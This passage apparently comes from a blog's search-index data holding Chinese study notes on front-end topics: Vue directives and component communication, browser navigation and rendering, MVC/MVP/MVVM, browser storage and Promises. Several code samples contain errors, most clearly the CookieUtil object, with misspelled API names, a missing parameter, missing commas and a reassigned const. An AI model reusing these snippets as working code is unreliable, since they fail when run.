元素一直存在\n  + v-if：显示隐藏式将 **dom 元素整个添加或删除**\n\n+ 编译条件：\n\n  + v-show：会**被编译成指令**，条件不满足时控制样式将对应节点隐藏\n\n  + v-if：会**被转换成三元表达式**，条件不满足时不渲染\n\n    > 是真正的条件渲染，它会确保在切换过程中，条件块内的事件监听器和子组件销毁和重建，只有渲染条件为假时，不做操作，\n\n+ 编译过程：\n\n  + v-show：简单的**基于 css 切换**\n  + v-if：有一个**局部编译 / 卸载过程**，切换过程中适当地销毁和重建内部的事件监听和子组件\n\n+ 状态切换：\n\n  + v-show：**不会触发生命周期**\n\n  + v-if：false → true 触发组件的 beforeCreate、created、beforeMount、mounted；\n\n    ​          true → false 触发组件 beforeDestory、destoryed\n\n+ 性能消耗：\n\n  +  v-show：有更高的**初始化渲染消耗**\n  + v-if：有更高的**切换消耗**\n\n### 2. v-if 不建议与 v-for 一起使用\n\nv-if 和 v-for 都是 vue 模板系统中的指令，在 vue 模板编译的时候，会将指令系统转化成可执行的 render 函数。\n\n**v-for 比 v-if 的优先级高**，当 v-if 和 v-for 在同一个标签时，会先遍历渲染，然后再进行判断是否展示，所以就会渲染一些无用节点，增加无用的 dom 操作，可以**通过 computed 或者 \\<template\\> 解决**\n\n> eg：\n>\n> ```html\n> <div v-for=\"item in [1, 2, 3, 4, 5, 6, 7]\" v-if=\"item !== 3\">\n>     {{item}}\n> </div>\n> ```\n>\n> 上面的写法是`v-for`和`v-if`同时存在，会先把7个元素都遍历出来，然后再一个个判断是否为3，并把3给隐藏掉，这样的坏处就是，**渲染了无用的3节点，增加无用的dom操作，建议使用computed来解决**这个问题：\n>\n> ```vue\n> <div v-for=\"item in list\">\n>     {{item}}\n> </div>\n> <script>\n> computed() {\n>     list() {\n>         return [1, 2, 3, 4, 5, 6, 7].filter(item => item !== 3)\n>     }\n>   }\n> </script>\n> ```\n\n\n\n所以有这样的注意事项：\n\n1. 不要把 v-if v-for 放在同一个元素上，会带来性能方面的浪费\n\n2. 如果避免出现浪费又非得再同一个标签上，可以在**外层嵌套 template 标签**，**页面渲染不会生成 dom 节点**，在这层进行 v-if 判断，然后在内部进行 v-for 循环\n\n   > ~~~html\n   > <template v-if=\"isShow\">\n   >     <p v-for=\"item in items\">\n   > </template>\n   > ~~~\n\n3. 如果条件出现在**循环内部**，可以**通过计算属性 computed 提前过滤**不需要显示的项\n\n   > ~~~js\n   > computed: {\n   >     items: function() {\n   >       return this.list.filter(\n   >           function (item) {\n   >         \t\treturn item.isShow\n   >           }\n   >       })\n   >     }\n   > }\n   > ~~~\n\n","tags":["vue"],"categories":["furtherNotes"]},{"title":"导航流程 和 渲染流程","url":"/furtherNotes/further/01 导航和渲染流程","content":"\n### 1. 详细流程\n\n#### 1.1 导航流程\n\n1. **用户输入**\n\n   当用户在地址栏输入搜索关键字时，**地址栏会判断输入的是搜索内容还是url**。若是搜索内容，地址栏会根据浏览器的默认搜索引擎合成搜索关键字url；若是url，则会根据协议，合成完整的请求url.\n\n2. **资源请求过程**\n\n   浏览器进程会通过 **IPC**进程间的通信 将**请求url发送给网络进程**，网络进程接收到请求后，会在此发起真正的url请求：\n\n   首先**查找本地缓存**是否缓存了该资源，若有该资源的缓存，则将缓存返回；若无，则进行**网络资源请求**，进行**DNS域名解析**，获取请求域名的ip和端口号，若使用了 https 协议，还需要进行 **TLS 连接**\n\n   然后**利用该 ip 与服务器进行 tcp 连接**，连接后，浏览器开始**构建请求头，请求行数据**，并将与该域名有关的 **cookie 附加到请求头**中，将**构建好的请求数据发送给服务器**\n\n   服务器接收到后，根据请求数据，**生成响应数据发送给网络进程**，当网络进程接收到响应头和响应行数据后，开始**解析响应头**：\n\n   ​\t当返回的状态码为 **301 / 302** 时，说明服务器要让浏览器**重定向**到其他的url，网络进程会到 **响应头的 location 读取重定向的地址**，然后**重新发送请求**；若返回的是 200 ，则继续进行导航流程\n\n   ​\t浏览器根据 **content-type** 进行区分返回的类型，若返回的是 **下载类型**，则将其提交给**浏览器的下载管理器**，导航结束；若返回的是 html 页面则**开始准备渲染进程**\n\n3. 准备渲染进程\n\n   默认请求下会开启一个**新的** 渲染进程，但是如果是开启同一个站点的页面时，会**复用**原来的渲染进程。此时还不能进行文档解析，文档还在网络进程中，得等到文档提交后\n\n4. 提交文档阶段\n\n   浏览器进程**向渲染进程发送 提交文档** — 响应数据 的消息，渲染进程接收到后，与网络进程**创建一个可以传输数据的管道**，当响应数据传输完成后，渲染进程**向浏览器进程发送 确认提交文档** 的消息，此时**浏览器会更新页面状态**，包括 地址栏url、历史状态、web页面\n\n5. 渲染阶段\n\n   渲染进程开始页面解析和子资源下载\n\n#### 1.2 渲染流程\n\n1. 构建 DOM 树 - dom：**渲染进程**将 **HTML 内容**转化为可以理解的 **DOM 树结构**\n2. 计算布局 - style：**渲染引擎**将 **CSS 样式文件**转化为浏览器可以理解的 **stylesheets**，并**计算节点的样式**\n3. 生成布局树 - layout：**创建布局树**，并**计算元素的布局信息**\n4. 分层 - layer：对布局树**进行分层**，并**生成分层树**\n5. 图层绘制 - paint：为每个图层**生成绘制列表**，并**提交给合成线程**\n6. 光栅化操作 - tiles raster：**合成线程将图层分成图块**，并在**光栅化线程池中将图块生成位图**\n7. 合成 - drawquad：合成进程将**绘制图块命令** drawquad 发送给浏览器进程\n8. 显示 - display：浏览器进程根据 drawquad 消息**合成页面，并显示**在显示器上\n\n\n\n### 2. 简便流程\n\n#### 2.1 导航流程\n\n+ 用户输入 url 并回车\n+ 浏览器进程检查 url，组装协议，构成完整的 url\n+ 浏览器进程通过进程间通信 IPC 把 url 请求发送给网络进程\n+ 网络进程接收到url 请求后检查本地缓存是否缓存了该请求资源，如果有则将该资源返回给浏览器进程\n+ 如果没有，网络进程向服务器发起 http 网络请求：\n  + 进行 DNS 解析，获取服务器 ip地址\n  + 利用 ip 与 服务器建立 tcp 连接\n  + 构建请求头信息\n  + 发送请求头信息\n  + 服务器响应后，网络进程接收响应头和响应信息，并解析响应内容\n+ 网络进行解析响应信息：\n  + 检查状态码，如果是 301 / 302，则需要重定向，从 location 读取地址，重新进行第四步，如果是 200 则继续处理请求\n  + 200 响应处理：检查响应类型 Content - Type，如果是字节流类型，则将该请求提交给下载管理器，该导航流程结束，如果是 html 则通知浏览器进程准备 渲染进程 准备渲染\n+ 准备渲染进程，浏览器进程检查当前 url 是否跟之前打开的渲染进程 根域名 是否相同。如果相同，则复用原来的进程，如果不同，则开启新的渲染进程\n+ 传输数据，更新状态\n  + 渲染进程准备好后，浏览器向渲染进程发起 提交文档 消息，渲染进程 接收到消息和网络进程建立传输数据的管道\n  + 渲染进程接收完数据后，向浏览器发送 确认提交\n  + 浏览器进程接收到确认消息后，更新浏览器界面状态：安全、地址栏 url、前进后退的历史状态、更新 web 页面\n\n#### 2.2 渲染流程\n\n1. 构建 DOM 树\n2. 计算布局\n3. 生成布局树\n4. 分层\n5. 图层绘制\n6. 光栅化操作\n7. 合成\n8. 显示\n\n\n\n### 3. 相关概念 重排 重绘 合成\n\n#### 3.1 重排 — 更新了元素的几何属性\n\n<img src=\"https://static001.geekbang.org/resource/image/b3/e5/b3ed565230fe4f5c1886304a8ff754e5.png\" style=\"zoom:67%;\" >\n\n若 通过 js 或者 css 修改元素的几何位置，那么浏览器会**触发重新布局**，解析之后的一系列子阶段，这个过程是重排，重排需要更新完整的渲染流水线，所以开销最大。\n\n#### 3.2 重绘 — 更新元素的绘制属性\n\n<img src=\"https://static001.geekbang.org/resource/image/3c/03/3c1b7310648cccbf6aa4a42ad0202b03.png\" style=\"zoom:67%;\" >\n\n若改变元素的背景颜色，那么布局阶段不会被执行，因为**没有引起几何位置的交换，就直接进入了绘制阶段**，然后执行之后的一系列子阶段，这个过程是重绘。相较于重排操作，重绘省去了布局和分层阶段，所以执行效率比重排高。\n\n#### 3.3 合成\n\n<img src=\"https://static001.geekbang.org/resource/image/02/2c/024bf6c83b8146d267f476555d953a2c.png\" style=\"zoom:67%;\" >\n\n渲染引擎**跳过布局和绘制，只执行后续的合成操作**，这个过程是合成。eg 使用 css3的 transfrom 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。效率最高。\n\n","tags":["网络"],"categories":["furtherNotes"]},{"title":"为什么 data 属性是一个函数而不是一个对象？","url":"/furtherNotes/further/02 组件中的data是函数","content":"\n> 参考链接:\n>\n> https://vue3js.cn/interview/vue/data.html\n\n\n### 1. 实例和组件定义 data 的区别\n\n+ vue 实例的时候定义 data 属性可以是对象也可以是函数\n\n  ~~~js\n  const app = new Vue({\n      el:\"#app\",\n      data:{ // 对象\n          foo:\"foo\" \n      },  \n      data(){ //函数\n          return { foo:\"foo\" } \n      } \n  })\n  ~~~\n\n+ 组件中定义 data 属性，只能是一个函数，如果直接定义为一个对象，会报警告\n\n  警告说明：返回的 data 应该是一个函数在每一个组件实例中\n\n### 2. 组件 data 定义函数与对象的区别\n\n在定义好一个组件时， vue 最终会通过 vue.extend() 构成组件实例\n\n当组件定义 data 属性时，采用对象的形式，在使用该组件创建多个组件实例的时候，当一个组件修改了data里面的值，其他组件的 data 也会被修改。\n\nbut 采用函数的形式时，就不会出现这种请求，因为函数返回的对象内存地址不相同，修改一个实例 data 时，其他组件实例 data 不受影响\n\n### 3. 结论\n\n+ 根实例对象 data 可以是对象也可以是函数，根实例是单例，不会产生数据污染的情况\n+ 组件实例对象 data 必须是函数，目的是为了防止多个组件实例对象之间共用一个 data，产生数据污染。采用函数的形式，initData 时会将其作为工厂函数都会返回全新 data 对象","tags":["vue"],"categories":["furtherNotes"]},{"title":"vue组件通信的方式","url":"/furtherNotes/further/03 vue组件通信","content":"\n> 参考链接：\n>\n> https://juejin.cn/post/6844903887162310669  8\n>\n> https://juejin.cn/post/6999687348120190983  12\n>\n> https://vue3js.cn/interview/vue/communication.html 8\n\n\n## 总结\n\n+ 父子之间的通信：`props` ; `$parent / $children`；`provide / inject`；`ref` ；`$attrs / $listeners`\n+ 兄弟组件通信：`eventBus`；`vuex`\n+ 跨级通信：`eventBus`；`Vuex`；`provide / inject`；`$attrs / $listenters`\n\n## 组件通信有哪几种方式\n\n#### 1.props / $emit：\n\n适用场景：父组件传递数据给子组件 / 子组件传递数据给父组件\n\n父组件向子组件传递数据是通过 props 传递的，子组件传递数据给父组件是通过 \\$emit 触发事件 做到的\n\n\n\n#### 2. $children / \\$parent：\n\n指定已创建的实例之父实例，在两者之间建立父子关系。子实例可以用 this.$parent 访问父实例，子实例被推入父实例的 \\$children 数组中。\n\n> \\$parent 是对象；\\$children 是数组\n>\n> 其目的主要是作为访问组件的应急方法，更推荐 props 和 event 实现父子通信\n\n\n\n#### 3. provide / inject：\n\n父组件通过 provide 来提供变量，然后在子组件中通过 inject 来注入变量\n\n> ~~~vue\n> // A.vue\n> <div> <comB></comB> </div>\n> <script>\n> export default{\n>     name:\"A\",\n>     provide:{ for: \"demo\" }\n> }\n> </script>\n> \n> // B.vue\n> <div> {{ demo }} <comC></comC> </div>\n> <script>\n> export default{\n>     name:\"B\",\n>     inject:['for'],\n>     data(){ return { demo:this.for } }\n> }\n> </script>\n> \n> // C.vue\n> <div> {{ demo }} </div>\n> <script>\n> export default{\n>     name:\"C\",\n>     inject:['for'],\n>     data(){ return { demo:this.for } }\n> }\n> </script>\n> ~~~\n\n\n\n#### 4. ref / $refs\n\n适用场景：父组件在使用子组件时设置 ref、父组件通过设置在子组件 refs 获取数据\n\nref 如果在普通的 dom 元素使用，引用指向的就是 dom 元素；\n\n如果用在子组件上，引用就指向组件实例，可以**通过实例直接调用组件的方法或访问数据**\n\n> ~~~vue\n> // app.vue\n> <div> <comA ref=\"comA\"></comA> </div>\n> <script>\n> export default{\n>     mounted(){\n>         const comA = this.$refs.comA;\n>         const nameA = comA.name;\n>     }\n> }\n> </script>\n> \n> // comA.vue\n> <script>\n> export default{\n>     data(){\n>         return {\n>             name:'A'\n>         }\n>     }\n> }\n> </script>\n> ~~~\n\n\n\n#### 5. **eventBus**\n\n使用场景：兄弟组件传值\n\n事件总线，在 vue 中可以使用其作为沟通桥梁的概念，就像是所有组件共用相同的事件中心，可以向该中心注册发送事件或接收事件，所有组件都可以通知其他组件。当项目比较大的时候，容易造成难以维护的灾难。\n\n> ~~~js\n> // 1. 初始化\n> // event-bus.js\n> import Vue from 'vue'\n> export const EventBus = new Vue()\n> \n> // 2. 发送事件\n> // showNumCom 和 additionNumCom 是兄弟组件 其实是父子也可以\n> // additionNum.vue\n> <div>  <button @click=\"additionHandle\" >+</button>  </div>\n> import {EventBus} from './event-bus.js'\n> export default {\n>     data(){\n>         return { num:1 }\n>     },\n>     methods:{\n>         additionHandle(){\n>             EventBus.$emit('addition',{ num: this.num++ })\n>         }\n>     }\n> }\n> \n> // 3. 接收事件\n> // showNum.vue\n> <div> 计算和:{{count}} </div>\n> import {EventBus} from './event-bus.js'\n> export default {\n>     data(){\n>         return { count:0 }\n>     },\n>     mounted(){\n>         EventBus.$on('addition',param => {\n>             this.count = this.count + param.num;\n>         })\n>     }\n> }\n> // 实现了在组件 additionNum 中点击 + ，在 showNum 中利用传递来的 num 展示求和的结果\n> \n> // 4. 溢出事件监听者\n> import {eventBus} from 'event-bus.js'\n> EventBus.$off('addition',{})\n> ~~~\n\n\n\n#### 6. Vuex\n\nvuex 是一个专门为 vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组建的 状态，并以相应的规则保证状态以一种可预测的方式发生变化。vuex 解决了 **多个视图依赖于同一状态** 和 **来自不同视图的行为需要变更同一状态** 的问题，讲开发者的精力聚焦于数据的更新而不是数据在组件之间的传递上\n\n+ state：用于数据的存储，是 store 中的唯一数据源\n+ getters：如 computed，基于 state 数据的二次包装，常用于数据的筛选和多个数据的相关性计算\n+ mutations：类似函数，改变 state 数据的唯一途径，且不能用于处理异步事件\n+ actions：类似于 mutation，用于提交 mutation 来改变状态，而不直接变更状态，可以包含任意异步操作\n+ modules：类似命名空间，用于项目中将各个模块的状态分开定义和操作\n\n#### 7. localStorage / seesionStorage\n\n#### 8.  \\$attrs / \\$listeners\n\n使用场景：祖先传递数据给子孙\n\n+ $attrs：包含父作用域里除 class 和 style 除外的非 props **属性集合**。通过 this.\\$attrs 获取父作用域中所有符合条件的属性集合，若还要继续传给子组件内部的其他组件，可以通过 v-bind=‘\\$attrs’\n+ $listeners：包含父作用域里 .native 除外的监听**事件集合**。如果还要继续传给子组件内部的其他组件，可以通过 v-on=“\\$linteners”\n+ **inheritAttrs**\n\n> ~~~vue\n> // parent.vue\n> <child name=\"name\" title='111'></child>\n> \n> // child.vue\n> <sun-child v-bind=\"$attrs\"></sun-child>\n> <script>\n> export defalut{\n> \tprops:['name'], //这里可以接收也可不接收，if接收，this.$arrts 中就会少一个值\n> \tmounted(){\n> \t\tconsole.log(this.$attrs); // {title:111} , \n>                                   // if 上无接收 {name:'name',...}\n> \t},\n>     inheritAttrs: false, // 可以关闭自动挂载到组件根元素上的没有在props声明的属性\n> }\n> </script>\n> ~~~\n>\n> \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["vue"],"categories":["furtherNotes"]},{"title":"MVC MVP MVVM","url":"/furtherNotes/further/01 MVC MVP MVVM","content":"\n>\n> 整理 MV 系列框架概念\n>\n> http://c.biancheng.net/view/7743.html\n\n\n## 1. MVC 框架\n\nMVC 框架流程图 和 框架图 如下（实线表示调用，虚线表示通知）在 Controller 控制层会接收用户的所有操作，并根据写好的代码进行相应的操作\n\n\n\n<img src=\"http://c.biancheng.net/uploads/allimg/200525/1-2005251033103O.gif\" style=\"zoom:67%;float:left\" ><img src='http://c.biancheng.net/uploads/allimg/200525/1-200525102U9463.gif' style=\"zoom:67%;float:left;\" >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<font color='red'>特点</font>：controller 控制 model 层将数据赋值给 view 层。\n\n<font color='red'>缺点</font>：MVC 框架的大部分 逻辑和代码量 都集中在 controller 层，这带给 controller 层造成很大压力，且已经有独立处理事件能力的 view 层没有用到；controller 和 view 之间是一一对应的，断绝了 view 层复用的可能，因此产生了很多冗余的代码\n\n<font color='red'>注</font>：controller 触发 view 时，并不会更新 view 层中的数据，\n\n​         view 中的数据是通过监听 model 数据变化而自动更新的，与 controller 无关\n\n\n\n## 2. MVP 框架\n\nMVP — Model View Presenter\n\nMVP 框架流程图 和 框架图 如下，\n\n<img src=\"http://c.biancheng.net/uploads/allimg/200525/1-20052510440U32.gif\" style=\"zoom:67%;float:left;\" ><img src=\"http://c.biancheng.net/uploads/allimg/200525/1-200525103Z52a.gif\" style=\"zoom:67%;float:left;\" >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n在 MVC 中，view 可以通过访问 Model 来更新，但在 MVP 中，View 不能直接访问 Model ，必须通过 Presenter 提供的接口，然后 Presenter 再去访问 Model。\n\n<font color='red'>特点</font>：Model 和 View 都必须通过 Presenter 来传递信息，所以完全分离了 View 和 Model ，双方不知道彼此的存在；因为 View 和 Model 没有关系，所以 View 可以抽离出来做成组件，在复用上比较好。\n\n<font color='red'>缺点</font>：因为 View 和 Model 都需要经过 Presenter，致使 Presenter 比较复杂，维护起来会有一定问题；而且因为没有绑定数据，所有数据都需要 Presenter 进行 “手动同步”，代码量比较大，也会有比较多的冗余。\n\n为了让 View 和 Model 的数据始终保持一致，避免同步，推出了 MVVM 框架：\n\n## 3. MVVM 框架\n\nMVVM 框架流程图 和 框架图 如下：\n\n<img src=\"http://c.biancheng.net/uploads/allimg/200525/1-200525105GH58.gif\" style=\"zoom:67%;float:left;\" ><img src='http://c.biancheng.net/uploads/allimg/200525/1-200525105346422.gif' style=\"zoom:67%;float:left\"  >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nVM：ViewModel 把 Model 和 View 的数据同步自动化了，解决了 MVP 中数据同步比较麻烦的问题，不仅减轻了 ViewModel 的压力，同时使得数据处理更加方便 — 只需告诉 View 展示的数据是 Model 中的哪部分即可。\n\n<font color='red'>特点</font>：ViewModel 双向绑定了 View 和 Model，因此，随着 View 的数据变化，系统会自动修改 MOdel 的数据，反之同理。\n\n> 而 Presenter 是采用手动写方法来调用或者修改 View 和 Model。\n\n<font color='red'>双向数据绑定</font>：双向数据绑定是一个模板引擎，它会根据数据的变化实时渲染，如图，View 和 Model 之间的修改都会同步到对方。\n\n<img src='http://c.biancheng.net/uploads/allimg/200525/1-200525110113316.jpg' style=\"zoom:67%;\" >\n\nMVVM 中数据绑定方法一般有以下3种：\n\n+ 数据劫持\n+ 发布 - 订阅模式\n+ 脏值检查\n\n> 其中 Vue.js 用的就是发布 - 订阅模式，**Observer（数据监听器）**用户监听数据变化，如果数据变化，不论是在 View 还是 Model，Observer 都会知道，然后告诉 **Watcher（订阅者）**。**Compiler（指定解析器）**的作用是对数据进行解析，之后绑定指定的事件，在这主要用于更新视图。\n\nVue.js 数据绑定的流程：首先将需要绑定的数据用数据劫持方法找出来，之后用 Observer 监听这堆数据，如果数据发生变化，Observer 就会告诉 Watcher，然后 Watcher 会决定让哪个 Compiler 去做相应的操作，这就完成了数据的双向绑定。\n\n \n\n## 4. 简述 3 种 框架 及其区别\n\n1. MVC：model 层存放数据逻辑，view 层用于显示数据，controller 层用于将 model 层的数据赋值给 view 层，而在 model 层数据变化的时候， view 在监听到后再修改显示的数据，即 view 是可以访问到 model 的\n\n   > 其实 所有处理业务的逻辑都在 controller 层上了，controller 压力繁重，而且 controller 层 跟 view 层其实算是一一对应的关系，所以代码难以复用\n\n2. MVP：此时 model 层和 view 层是不知道彼此的存在的，当 model 数据变化后，需要经过 presenter 层反馈给 view 层，然后才进行改变，\n\n   > 因为没有数据绑定，所有数据都要经过 presenter 手动同步，使得 presenter 代码繁重\n\n3. MVVM：viewModel 层实现了model 和 view 的双向数据绑定，当一方数据改变的时候，就会经过 viewModel 将另一方的数据同步更改。\n\n   > 发布者订阅模式：将要绑定的数据用数据劫持的方法找出来，用 数据监听器 observer 监听数据变化，当数据变化时，告诉 订阅者 Watcher，订阅者 找到适合的 指定解析器 去完成相应操作，完成了数据绑定\n","tags":["vue"],"categories":["furtherNotes"]},{"title":"浏览器存储精简版","url":"/furtherNotes/further/01 浏览器存储特点及区别","content":"\n> 觉得还是复习的不够\n>\n> https://zhuanlan.zhihu.com/p/128155801\n>\n> https://juejin.cn/post/7012506796489359368\n\n\n\n#### **1. cookie **\n\n+ 生命周期为在cookie设置的过期时间之前一直有效，即使窗口或者浏览器关闭；\n+ 存放数据大小为4K；\n+ 有存储个数限制（各浏览器不同），一般不超过20个；\n+ 与服务器端通信，每次都会携带在HTTP头中，cookie存储数据过多会带来性能问题；\n+ 有安全问题，在 HTTP 请求中的 Cookie 是明文传递的；\n+ 只能存储字符串\n+ 由于第三方Cookie的滥用，所以很多老司机在浏览网页时会禁用Cookie，所以我们不得不测试用户是否支持Cookie，这也是很麻烦的一件事\n\n#### 2. session\n\n\n\n#### 3. localStorage\n\n+ 生命周期永久，除非用户手动代码清除浏览器中的 localStorage 信息，否则永远存在\n+ 存放数据大小一般为 5MB\n+ 仅在浏览器中保存，不参与服务器通信\n+ 作用域为文档源级别，即同源的才能共享，可以互相读取对方的数据，甚至覆盖；但也受浏览器的限制\n\n#### 4. sessionStorage\n\n+ 仅在当前会话下有效，关闭页面或者浏览器后被清除；\n\n+ 存放数据大小一般为5MB；\n\n+ 仅在浏览器中保存，不参与服务器通信；\n\n+ 可以接受源生接口，亦可以再次封装来对Object和Array有更好的支持；\n\n","tags":["html5"],"categories":["furtherNotes"]},{"title":"Promise基本用法","url":"/furtherNotes/further/03 Promise","content":"\n> 2021.11.26 建的文件 12.3 终于打算写了\n>\n> 回调地狱 解决方案中 Promise\n>\n> 常见 promise 输出题：https://juejin.cn/post/6844904077537574919\n>\n> https://juejin.cn/post/6844903607968481287\n>\n> https://juejin.cn/post/6844903607968481287\n>\n> https://juejin.cn/post/6952083081519955998\n\n\n## Promise\n\n### 1. 简介\n\nPromise 是**异步编程的一种解决方案**：\n\n从语法上讲，promise 是一个对象，它可以获取异步操作的消息；\n\n从本意上讲，promise 是承诺，承诺它过一段时间会给你一个结果。\n\npromise 有三种状态：**pending**(等待态)、**fulfiled**(成功态)、**rejected**(失败态)；状态一旦改变，就不会再变。创建 promise 实例后，其会立即执行。\n\n>  Pending 变为 Fulfilled 会得到一个私有**value**，Pending 变为 Rejected会得到一个私有**reason**，当Promise达到了Fulfilled或Rejected时，执行的异步代码会接收到这个value或reason\n\npromise 解决的问题：\n\n+ 回调地狱，代码难以维护，常常第一个函数的输出是第二个函数的输入的这种现象\n+ promise 可以支持多个并发的请求，获取并发请求中的数据\n+ promise 可以解决异步的问题，但是不能说 promise 是异步的\n\n\n\n### 2. 基本用法\n\n+ resolve ：异步操作执行成功后的回调函数\n\n+ reject ：异步操作执行失败后的回调函数\n\n+ then ：捕获 promise 状态变化（成功 / 错误），并将拿到的数据进行操作\n\n+ catch：相当于 then(null,error => { … } )，then 的第二个参数\n\n+ all：接收一个promise 实例数组参数，返回一个以传入数组顺序的返回结果的数组，提供了并行执行异步操作的能力，在所有异步操作执行完后才执行回调\n\n  > ~~~js\n  > let Promise1 = new Promise(function(resolve, reject){})\n  > let Promise2 = new Promise(function(resolve, reject){})\n  > let Promise3 = new Promise(function(resolve, reject){})\n  > \n  > let p = Promise.all([Promise1, Promise2, Promise3])\n  > \n  > p.then(funciton(){\n  >   // 三个都成功则成功  \n  > }, function(){\n  >   // 只要有失败，则失败 \n  > })\n  > ~~~\n\n+ race：接收一个Promise 实例数组参数，返回最快执行完的操作结果\n\n  > 使用场景：可以用 race 给某个异步请求设置超时时间，并且在超时后执行相应的操作\n","tags":["es6","promise"],"categories":["furtherNotes"]},{"title":"浏览器存储详细版","url":"/furtherNotes/further/01 浏览器存储","content":"\n> 由cwenjoy 项目中使用到的 localStorage 引申出来的\n>\n> https://www.jianshu.com/p/072e17112759\n\n\n## 浏览器存储\n\n### 常见的浏览器数据存储方案\n\n1. Cookie\n2. Web 存储 ：localStorage 和 sessionStorage\n3. IndexedDB\n\n\n\n#### 1. Cookie\n\n##### 1.1 简介\n\nCookie 又称 HTTP Cookie，最初在客户端用于存储会话信息，从底层看，其作为 HTTP 协议的一种扩展实现，Cookie 数据会自动在 Web 浏览器和 Web 服务器之间传输，因此在服务器端脚本可以读写存储的 cookie 值，因此 Cookie 通常用户存储一些通用的数据。\n\n##### 1.2 优点\n\n相比于其他的存储方式， Cookie 的兼容性很好\n\n##### 1.3 缺点\n\n+ **存储量小**，在不同的浏览器上基本都是 4kb 大小\n+ **影响性能**，Cookie 会由浏览器作为请求头发送，当 Cookie 存储信息过多时，会影响特定域的资源获取效率，增加文件传输的负载\n+ **只能存储字符串**\n+ **安全问题**，存储在 Cookie 的任何数据可以被他人访问，因此不能再 Cookie 中存储重要信息\n+ 因为第三方滥用 Cookie，所以很多人再浏览网页时会禁用 Cookie，所以得测试用户是否支持 Cookie\n\n##### 1.4 操作\n\n基本操作：读取、写入、删除。\n\ncookie 中所有的名字和值都是经过 URI 编码的，所以必须使用 decodeURICompoent来进行解码才能得到 cookie 的值。\n\n~~~js\nvar CookieUtil = {\n    // get可根据cookie的名字获取相应的值\n    get: function() {\n        const cookieName = encodeURIcOMPONET(name) + \"=\",\n               cookieStart = document.cookie.indexOf(cookieName),\n               cookieValue = null\n        if(cookieStart > -1) {\n            const cookieEnd = document.cookie.indexOf(\";\", cookieStart)\n            if(cookieEnd == -1) {\n                cookieEnd = document.cookie.length\n            }\n            cookieValue = decodeURICompoent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd))  \n        }\n        return cookieValue\n    }\n    // set设置一个cookie\n    set: function(name, value, expires, path, domain, secure) {\n        var cookieText = encodeURIComponet(name)+\"=\"+encodeURIComponet(value)\n        if(expires instanceof Date) {\n            cookieText += \"; expires=\" + expires.toGMTString()\n        }\n        if(path) {\n            cookieText += \";path=\" + path\n        }\n        if(domain) {\n            cookieText += \"; domain\" + domain\n        }\n        if(secure) {\n            cookieText += \"; secure\"\n        }\n        document.cookie = cookieText\n    }\n    // 删除已有的cookie\n    unset: function(name, path, domain, secure) {\n        this.set(name, \"\", new Date(0), path, domain, secure)\n    }\n}\n~~~\n\n\n\n#### 2. Web 存储\n\nweb 存储机制最初作为 HTML5 的一部分被定义成 API 的形式，但由于其本身的独特性于一些原因被剥离出来，成为一个独立的标准。其包括 localStorage 对象 和 sessionStorage 对象。\n\n其产生的主要原因：\n\n1. 希望有一种再 cookie 之外存储会话数据的途径\n2. 希望有一种存储大量可以跨会话存在的数据的机制\n\n> 最初的 web 存储规范中包含了 sessionStorage 和 globalStorage 两种对象的定义，在支持这两个对象的浏览器中都是以 windows 对象属性的形式存在的\n\n\n\n#### 3. localStorage \n\n##### 3.1 简介\n\nlocalStorage 对象作为 **持久保存客户端数据**的方案 取代了 globalStorage。\n\n从功能上讲，可以通过 localStorage 在浏览器存储键值对数据，相比于 cookie，提供了更为直观的 API，在安全上相对好一点。\n\n虽然 localStorage 只能存储字符串，但也可以存储字符串化的 JSON 数据，因此相比 cookie ，localStorage 能存储更复杂的数据。\n\n##### 3.2 优点\n\n+ 提供了简单明了的 API 来进行操作\n+ 更加安全\n+ 可存储的数据量更大\n\n##### 3.3 语法\n\n~~~js\n// 使用方法存储数据\nlocalStorage.setItem(\"name\", \"Srtian\")\n// 使用属性存储数据\nlocalStorage.say = \"Hello world\"\n// 使用方法读取数据\nconst name = localStorage.getItem(\"name\")\n// 使用属性读取数据\nconst say = localStorage.say\n// 删除数据\nlocalStorage.removeItem(\"name\")\n~~~\n\n需要传输其他格式的数据时，我们就需要将这些数据全部转换为字符串格式，然后再进行存储\n\n获取值时将其转化回来\n\n~~~js\nconst user = {name:\"Srtian\", age: 22}\nlocalStorage.setItem(\"user\", JSON.stringify(user))\n\nvar age = JSON.parse(localStorage.user)\n~~~\n\n\n\n##### 3.4 存储数据的有效期 与 作用域\n\n通过localStorage存储的数据时永久性的，除非我们使用removeItem来删除或者用户通过设置浏览器配置来删除，负责数据会一直保留在用户的电脑上，永不过期。\n\n\n\nlocalStorage的作用域限定在文档源级别的（意思就是同源的才能共享），同源的文档间会共享localStorage的数据，他们可以互相读取对方的数据，甚至有时会覆盖对方的数据。当然，localStorage的作用域同样也受浏览器的限制。\n\n\n\n#### 4. sessionStorage\n\n##### 4.1 简介\n\n与 localStorage 相似，不同之处在于 localStorage里面存储的数据没有过期时间设置，而Session Storage只存储当前会话页的数据，且只有当用户关闭当前会话页或浏览器时，数据才会被清除。\n\n##### 4.2 语法\n\n~~~js\n// 保存数据到sessionStorage\nsessionStorage.setItem('name', 'Srtian');\n\n// 从sessionStorage获取数据\nvar data = sessionStorage.getItem('name');\n\n// 从sessionStorage删除保存的数据\nsessionStorage.removeItem('name');\n\n// 从sessionStorage删除所有保存的数据\nsessionStorage.clear();\n~~~\n\n\n\n#### 5. indexedDB\n\n##### 5.1 简述\n\n由HTML5所提供的一种本地存储，用于在浏览器中储存较大数据结构的 Web API，并提供索引功能以实现高性能查找。它一般用于保存大量用户数据并要求数据之间有搜索需要的场景，当网络断开时，用户就可以做一些离线的操作。它较之SQL更为方便，不需要写一些特定的语法对数据进行操作，数据格式是JSON。\n\n##### 5.2 语法\n\n1. **创建数据库 并 指定数据库版本号**\n\n   ~~~js\n   // 注意数据库的版本号只能是整数\n   const request = IndexedDB.open(databasename, version)\n   ~~~\n\n2. **生成处理函数**\n\n   ~~~js\n   request.onerror = function() {\n       // 创建数据库失败时的回调函数\n   }\n   request.onsuccess = function() {\n       // 创建数据库成功时的回调函数\n   }\n   request.onupgradeneededd = function(e) {\n        // 当数据库改变时的回调函数   唯一可以修改数据库结构的地方  